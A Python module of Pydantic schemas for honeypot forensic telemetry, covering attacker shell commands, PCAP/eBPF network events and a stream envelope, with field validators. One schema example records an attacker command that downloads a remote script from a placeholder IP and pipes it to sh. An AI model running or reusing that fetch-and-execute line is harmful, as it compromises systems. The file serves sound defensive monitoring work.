"""
Shared Real-Time Forensic Telemetry Contracts.

This module standardizes real-time forensic telemetry captured from isolated honey
containers (`isolation_sandbox/isolated_honey_containers`) by the Forensic Extraction Engine
(`forensic_extraction_engine`), including attacker shell commands and network/kernel packets (PCAP/eBPF).
"""

from __future__ import annotations

import ipaddress
from datetime import datetime, timezone
from enum import Enum
from typing import Optional

from pydantic import BaseModel, ConfigDict, Field, field_validator, model_validator


class TelemetrySourceEnum(str, Enum):
    """Enumeration of forensic telemetry capture subsystems."""

    COMMAND_LOGGER = "COMMAND_LOGGER"
    PCAP_SNIFFER = "PCAP_SNIFFER"
    EBPF_KERNEL_PROBE = "EBPF_KERNEL_PROBE"
    CONTAINER_RUNTIME = "CONTAINER_RUNTIME"


class AttackerCommandEvent(BaseModel):
    """
    Contract documenting a shell command or process execution performed by an attacker
    inside an isolated honey container.
    """

    model_config = ConfigDict(
        str_strip_whitespace=True,
        validate_assignment=True,
        extra="forbid",
        json_schema_extra={
            "examples": [
                {
                    "event_id": "cmd_evt_901a2b3c4d5e",
                    "session_id": "550e8400-e29b-41d4-a716-446655440000",
                    "container_id": "honey_sbx_01a2b3c4d5e6",
                    "timestamp": "2026-11-05T00:13:15Z",
                    "command_line": "curl -s http://198.51.100.99/payload.sh | sh",
                    "working_directory": "/tmp",
                    "process_id": 4128,
                    "parent_process_id": 4096,
                    "executed_by_user": "www-data",
                    "exit_code": 0,
                }
            ]
        },
    )

    event_id: str = Field(
        ...,
        min_length=4,
        max_length=128,
        description="Unique identifier for the captured command event.",
    )
    session_id: str = Field(
        ...,
        min_length=8,
        max_length=128,
        description="Session identifier of the trapped attacker.",
    )
    container_id: str = Field(
        ...,
        min_length=4,
        max_length=128,
        description="Identifier of the isolated honey container where the command executed.",
    )
    timestamp: datetime = Field(
        default_factory=lambda: datetime.now(timezone.utc),
        description="UTC timestamp when the command execution was captured.",
    )
    command_line: str = Field(
        ...,
        min_length=1,
        max_length=8192,
        description="Full command line string and arguments executed by the attacker.",
    )
    working_directory: str = Field(
        ...,
        min_length=1,
        max_length=1024,
        description="Working directory path inside the container when the command was invoked.",
    )
    process_id: int = Field(
        ...,
        ge=1,
        description="Process ID (PID) assigned inside the container namespace.",
    )
    parent_process_id: int = Field(
        ...,
        ge=0,
        description="Parent Process ID (PPID) inside the container namespace.",
    )
    executed_by_user: str = Field(
        ...,
        min_length=1,
        max_length=128,
        description="OS username or UID under which the command was executed.",
    )
    exit_code: int = Field(
        ...,
        ge=-255,
        le=255,
        description="Process exit status code returned upon completion.",
    )

    @field_validator("working_directory")
    @classmethod
    def validate_working_directory(cls, value: str) -> str:
        """Ensure working_directory is a valid absolute path starting with '/'."""
        cleaned = value.strip()
        if not cleaned.startswith("/"):
            raise ValueError("working_directory must be an absolute container path starting with '/'.")
        return cleaned

    @field_validator("timestamp")
    @classmethod
    def ensure_timestamp_utc(cls, value: datetime) -> datetime:
        """Normalize command event timestamp to UTC."""
        if value.tzinfo is None:
            return value.replace(tzinfo=timezone.utc)
        return value.astimezone(timezone.utc)


class NetworkTelemetryEvent(BaseModel):
    """
    Contract documenting network packet activity (PCAP) and kernel-level system call
    telemetry (eBPF) associated with an isolated honey container.
    """

    model_config = ConfigDict(
        str_strip_whitespace=True,
        validate_assignment=True,
        extra="forbid",
        json_schema_extra={
            "examples": [
                {
                    "event_id": "net_evt_77c8d9e0f1a2",
                    "session_id": "550e8400-e29b-41d4-a716-446655440000",
                    "container_id": "honey_sbx_01a2b3c4d5e6",
                    "timestamp": "2026-11-05T00:13:16Z",
                    "source_ip": "172.29.0.15",
                    "source_port": 49152,
                    "destination_ip": "198.51.100.99",
                    "destination_port": 443,
                    "protocol": "TCP",
                    "packet_length_bytes": 512,
                    "ebpf_syscall_name": "sys_enter_connect",
                    "pcap_chunk_ref": "pcap_chunk_20261105_001316_01.pcap",
                }
            ]
        },
    )

    event_id: str = Field(
        ...,
        min_length=4,
        max_length=128,
        description="Unique identifier for the network/kernel telemetry event.",
    )
    session_id: str = Field(
        ...,
        min_length=8,
        max_length=128,
        description="Session identifier of the trapped attacker.",
    )
    container_id: str = Field(
        ...,
        min_length=4,
        max_length=128,
        description="Identifier of the isolated honey container generating the traffic.",
    )
    timestamp: datetime = Field(
        default_factory=lambda: datetime.now(timezone.utc),
        description="UTC timestamp when the packet or syscall was observed.",
    )
    source_ip: str = Field(
        ...,
        description="Source IPv4 or IPv6 address of the packet.",
    )
    source_port: int = Field(
        ...,
        ge=0,
        le=65535,
        description="Source TCP/UDP port number (0 for non-port protocols like ICMP).",
    )
    destination_ip: str = Field(
        ...,
        description="Destination IPv4 or IPv6 address of the packet.",
    )
    destination_port: int = Field(
        ...,
        ge=0,
        le=65535,
        description="Destination TCP/UDP port number (0 for non-port protocols like ICMP).",
    )
    protocol: str = Field(
        ...,
        min_length=2,
        max_length=16,
        description="Network transport or application protocol (e.g., TCP, UDP, ICMP, HTTP, DNS).",
    )
    packet_length_bytes: int = Field(
        ...,
        ge=0,
        description="Total captured packet length in bytes.",
    )
    ebpf_syscall_name: Optional[str] = Field(
        default=None,
        min_length=2,
        max_length=128,
        description="Optional kernel syscall name intercepted via eBPF probe (e.g., sys_enter_connect).",
    )
    pcap_chunk_ref: Optional[str] = Field(
        default=None,
        min_length=3,
        max_length=512,
        description="Optional reference URI or filename of the associated PCAP capture chunk.",
    )

    @field_validator("source_ip", "destination_ip")
    @classmethod
    def validate_ip_addresses(cls, value: str) -> str:
        """Validate that source_ip and destination_ip are valid IPv4 or IPv6 addresses."""
        try:
            ip_obj = ipaddress.ip_address(value.strip())
            return str(ip_obj)
        except ValueError as exc:
            raise ValueError(f"Invalid IPv4/IPv6 address in network telemetry: '{value}'.") from exc

    @field_validator("protocol")
    @classmethod
    def normalize_protocol(cls, value: str) -> str:
        """Normalize protocol string to uppercase."""
        cleaned = value.strip().upper()
        if not cleaned.isalnum():
            raise ValueError("protocol must contain only alphanumeric characters.")
        return cleaned

    @field_validator("timestamp")
    @classmethod
    def ensure_timestamp_utc(cls, value: datetime) -> datetime:
        """Normalize network telemetry timestamp to UTC."""
        if value.tzinfo is None:
            return value.replace(tzinfo=timezone.utc)
        return value.astimezone(timezone.utc)


class TelemetryStreamEnvelope(BaseModel):
    """
    Unified envelope contract wrapping either an `AttackerCommandEvent`, a
    `NetworkTelemetryEvent`, or both for streaming to `data_storage` and `soc_dashboard`.
    """

    model_config = ConfigDict(
        str_strip_whitespace=True,
        validate_assignment=True,
        use_enum_values=False,
        extra="forbid",
        json_schema_extra={
            "examples": [
                {
                    "envelope_id": "env_55a6b7c8d9e0",
                    "source": "COMMAND_LOGGER",
                    "session_id": "550e8400-e29b-41d4-a716-446655440000",
                    "container_id": "honey_sbx_01a2b3c4d5e6",
                    "captured_at": "2026-11-05T00:13:15Z",
                    "command_event": {
                        "event_id": "cmd_evt_901a2b3c4d5e",
                        "session_id": "550e8400-e29b-41d4-a716-446655440000",
                        "container_id": "honey_sbx_01a2b3c4d5e6",
                        "timestamp": "2026-11-05T00:13:15Z",
                        "command_line": "whoami && id",
                        "working_directory": "/var/www/html",
                        "process_id": 4110,
                        "parent_process_id": 4096,
                        "executed_by_user": "www-data",
                        "exit_code": 0,
                    },
                    "network_event": None,
                }
            ]
        },
    )

    envelope_id: str = Field(
        ...,
        min_length=4,
        max_length=128,
        description="Unique identifier for the telemetry stream envelope.",
    )
    source: TelemetrySourceEnum = Field(
        ...,
        description="Subsystem source that emitted the telemetry envelope.",
    )
    session_id: str = Field(
        ...,
        min_length=8,
        max_length=128,
        description="Session identifier associated with the telemetry payload.",
    )
    container_id: str = Field(
        ...,
        min_length=4,
        max_length=128,
        description="Isolated honey container identifier from which the telemetry originated.",
    )
    captured_at: datetime = Field(
        default_factory=lambda: datetime.now(timezone.utc),
        description="UTC timestamp when the envelope was packaged by the extraction engine.",
    )
    command_event: Optional[AttackerCommandEvent] = Field(
        default=None,
        description="Optional attacker command execution payload.",
    )
    network_event: Optional[NetworkTelemetryEvent] = Field(
        default=None,
        description="Optional network packet / eBPF syscall telemetry payload.",
    )

    @field_validator("captured_at")
    @classmethod
    def ensure_captured_at_utc(cls, value: datetime) -> datetime:
        """Normalize envelope timestamp to UTC."""
        if value.tzinfo is None:
            return value.replace(tzinfo=timezone.utc)
        return value.astimezone(timezone.utc)

    @model_validator(mode="after")
    def validate_payload_presence(self) -> "TelemetryStreamEnvelope":
        """Ensure at least one telemetry event payload (command_event or network_event) is present."""
        if self.command_event is None and self.network_event is None:
            raise ValueError(
                "TelemetryStreamEnvelope must contain at least one of 'command_event' or 'network_event'."
            )
        return self
